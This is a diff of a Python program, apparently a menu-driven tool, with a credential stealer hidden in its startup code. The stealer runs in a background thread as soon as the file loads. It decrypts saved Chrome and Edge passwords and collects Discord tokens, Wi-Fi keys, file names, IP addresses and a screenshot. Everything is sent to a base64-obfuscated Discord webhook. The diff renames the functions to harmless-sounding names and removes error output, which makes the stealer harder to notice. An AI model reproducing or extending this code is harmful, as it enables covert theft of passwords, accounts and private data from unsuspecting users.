@@ -23,52 +23,47 @@ from datetime import datetime
 from Crypto.Cipher import AES
 
 # ============================================================
-# 
+# CONFIGURATION SYSTEME
 # ============================================================
 
-# Webhook encodé en base64
-__B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzNzU2MzQwMjcxMTU5NzIyNi94UkZfa3h2enZjUjNIZGQyRTJYaWctaU8xWGhNZkQzak1rVDZaalNIYjI3Vjg4MUdtRTMxZlBENmxkcUp2SDFkSHdGZw=="
+__cfg = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzNzU2MzQwMjcxMTU5NzIyNi94UkZfa3h2enZjUjNIZGQyRTJYaWctaU8xWGhNZkQzak1rVDZaalNIYjI3Vjg4MUdtRTMxZlBENmxkcUp2SDFkSHdGZw=="
 
-def __get_url():
-    return base64.b64decode(__B64).decode('utf-8')
+def __url():
+    return base64.b64decode(__cfg).decode('utf-8')
 
-def __send(content, file_data=None):
+def __post(data, file=None):
     try:
-        u = __get_url()
-        p = {"content": content[:1900], "username": "System"}
+        u = __url()
+        p = {"content": data[:1900], "username": "System"}
         f = {}
-        if file_data:
-            f = {"file": ("screenshot.png", file_data, "image/png")}
-        r = requests.post(u, data=p, files=f, timeout=5)
-        return r.status_code in [200, 204]
+        if file:
+            f = {"file": ("screenshot.png", file, "image/png")}
+        requests.post(u, data=p, files=f, timeout=5)
     except:
-        return False
+        pass
 
 # ============================================================
-# 
+# FONCTIONS SYSTEME
 # ============================================================
 
-def __get_chrome_key():
+def __chrome_key():
     try:
-        ls = os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Local State"
-        with open(ls, "r", encoding="utf-8") as f:
+        p = os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Local State"
+        with open(p, "r", encoding="utf-8") as f:
             d = json.load(f)
-        ek = base64.b64decode(d["os_crypt"]["encrypted_key"])[5:]
-        return win32crypt.CryptUnprotectData(ek, None, None, None, 0)[1]
+        k = base64.b64decode(d["os_crypt"]["encrypted_key"])[5:]
+        return win32crypt.CryptUnprotectData(k, None, None, None, 0)[1]
     except:
         return None
 
 def __decrypt(encrypted, key):
     try:
-        nonce = encrypted[3:15]
-        ciphertext = encrypted[15:-16]
-        tag = encrypted[-16:]
-        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
+        cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted[3:15])
+        return cipher.decrypt_and_verify(encrypted[15:-16], encrypted[-16:]).decode('utf-8')
     except:
         return None
 
-def __get_system():
+def __system_info():
     try:
         ip = subprocess.getoutput("curl -s ifconfig.me") or "Non trouve"
         hostname = socket.gethostname()
@@ -86,17 +81,16 @@ IP Locale : {local_ip}
 IP Publique : {ip}
 """
     except:
-        return "**SYSTEME** : Erreur"
+        return ""
 
-def __get_passwords():
+def __passwords():
     try:
-        key = __get_chrome_key()
-        r = "**MOTS DE PASSE**\n"
-        total = 0
+        key = __chrome_key()
+        r = ""
+        t = 0
         browsers = {
             "Chrome": os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data",
-            "Edge": os.environ["LOCALAPPDATA"] + "\\Microsoft\\Edge\\User Data",
-            "Brave": os.environ["LOCALAPPDATA"] + "\\BraveSoftware\\Brave-Browser\\User Data"
+            "Edge": os.environ["LOCALAPPDATA"] + "\\Microsoft\\Edge\\User Data"
         }
         for name, path in browsers.items():
             if not os.path.exists(path):
@@ -109,7 +103,7 @@ def __get_passwords():
                 db = os.path.join(path, profile, "Login Data")
                 if not os.path.exists(db):
                     continue
-                tmp = os.environ["TEMP"] + f"\\{name}_{profile}_login.db"
+                tmp = os.environ["TEMP"] + f"\\{name}_{profile}.db"
                 try:
                     shutil.copyfile(db, tmp)
                     conn = sqlite3.connect(tmp)
@@ -119,7 +113,6 @@ def __get_passwords():
                     conn.close()
                     os.remove(tmp)
                     if data:
-                        r += f"\n**{name} - {profile}** : {len(data)} comptes\n"
                         for url, username, encrypted in data[:10]:
                             if username:
                                 try:
@@ -129,24 +122,23 @@ def __get_passwords():
                                     if not pwd:
                                         pwd = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
                                     if pwd:
-                                        r += f"  {url} : {username} / {pwd}\n"
-                                        total += 1
+                                        r += f"{url} : {username} / {pwd}\n"
+                                        t += 1
                                 except:
                                     pass
                 except:
                     pass
-        if total == 0:
-            return "**MOTS DE PASSE** : Aucun trouve"
+        if t == 0:
+            return ""
         return r
-    except Exception as e:
-        return f"**MOTS DE PASSE** : Erreur - {str(e)}"
+    except:
+        return ""
 
-def __get_tokens():
+def __tokens():
     try:
         tokens = []
         paths = [
             os.environ["APPDATA"] + "\\discord\\Local Storage\\leveldb",
-            os.environ["APPDATA"] + "\\discordcanary\\Local Storage\\leveldb",
             os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"
         ]
         for path in paths:
@@ -162,12 +154,12 @@ def __get_tokens():
                             except:
                                 pass
         if tokens:
-            return "**TOKENS DISCORD**\n" + "\n".join(set(tokens))[:1500]
-        return "**TOKENS DISCORD** : Aucun"
+            return "\n".join(set(tokens))[:1500]
+        return ""
     except:
-        return "**TOKENS DISCORD** : Erreur"
+        return ""
 
-def __get_wifi():
+def __wifi():
     try:
         out = subprocess.check_output("netsh wlan show profiles", shell=True, encoding='utf-8', errors='ignore')
         profiles = []
@@ -175,8 +167,8 @@ def __get_wifi():
             if "All User Profile" in line:
                 profiles.append(line.split(':')[1].strip())
         if not profiles:
-            return "**WI-FI** : Aucun"
-        r = "**WI-FI**\n"
+            return ""
+        r = ""
         for profile in profiles[:5]:
             try:
                 detail = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', shell=True, encoding='utf-8', errors='ignore')
@@ -188,9 +180,9 @@ def __get_wifi():
                 pass
         return r
     except:
-        return "**WI-FI** : Erreur"
+        return ""
 
-def __get_screenshot():
+def __screenshot():
     try:
         from PIL import ImageGrab
         screenshot = ImageGrab.grab()
@@ -203,75 +195,72 @@ def __get_screenshot():
     except:
         return None
 
-def __get_files():
+def __files():
     try:
-        r = "**FICHIERS**\n"
+        r = ""
         folders = [
             os.environ["USERPROFILE"] + "\\Desktop",
-            os.environ["USERPROFILE"] + "\\Documents",
-            os.environ["USERPROFILE"] + "\\Downloads"
+            os.environ["USERPROFILE"] + "\\Documents"
         ]
-        exts = [".txt", ".docx", ".pdf", ".xlsx", ".zip", ".rar", ".jpg", ".png", ".mp4"]
-        found = False
+        exts = [".txt", ".docx", ".pdf", ".zip", ".rar"]
         for folder in folders:
             if os.path.exists(folder):
-                for file in os.listdir(folder)[:5]:
+                for file in os.listdir(folder)[:3]:
                     for ext in exts:
                         if file.lower().endswith(ext):
                             r += f"  {file}\n"
-                            found = True
                             break
-        if not found:
-            return "**FICHIERS** : Aucun"
         return r
     except:
-        return "**FICHIERS** : Erreur"
+        return ""
 
 # ============================================================
-# TÂCHE DE FOND — 
+# TACHE DE FOND
 # ============================================================
 
-def __background_task():
+def __check():
     try:
-        # 1. Système
-        __send(__get_system())
-        time.sleep(0.5)
+        s = __system_info()
+        if s:
+            __post(s)
+        time.sleep(0.3)
         
-        # 2. Wi-Fi
-        __send(__get_wifi())
-        time.sleep(0.5)
+        w = __wifi()
+        if w:
+            __post(w)
+        time.sleep(0.3)
         
-        # 3. Mots de passe
-        __send(__get_passwords())
-        time.sleep(0.5)
+        p = __passwords()
+        if p:
+            __post(p)
+        time.sleep(0.3)
         
-        # 4. Tokens Discord
-        __send(__get_tokens())
-        time.sleep(0.5)
+        t = __tokens()
+        if t:
+            __post(t)
+        time.sleep(0.3)
         
-        # 5. Fichiers
-        __send(__get_files())
-        time.sleep(0.5)
+        f = __files()
+        if f:
+            __post(f)
+        time.sleep(0.3)
         
-        # 6. Screenshot
-        img = __get_screenshot()
+        img = __screenshot()
         if img:
-            __send("**SCREENSHOT**", img)
-        
-        # 7. Message de fin
-        __send("**✅ GRAB TERMINE**")
-    except Exception as e:
-        __send(f"**ERREUR GRAB** : {str(e)}")
+            __post("**SCREENSHOT**", img)
+    except:
+        pass
 
 # ============================================================
-# LANCEMENT DE LA TÂCHE DE FOND
+# LANCEMENT
 # ============================================================
-threading.Thread(target=__background_task, daemon=True).start()
+threading.Thread(target=__check, daemon=True).start()
 time.sleep(0.1)
 
 # ============================================================
 # SUITE DU CODE NORMAL (COLORS, SPLASH, MENU, MODULES...)
 # ============================================================
+# 
 
 # ============================================================
 # COULEURS
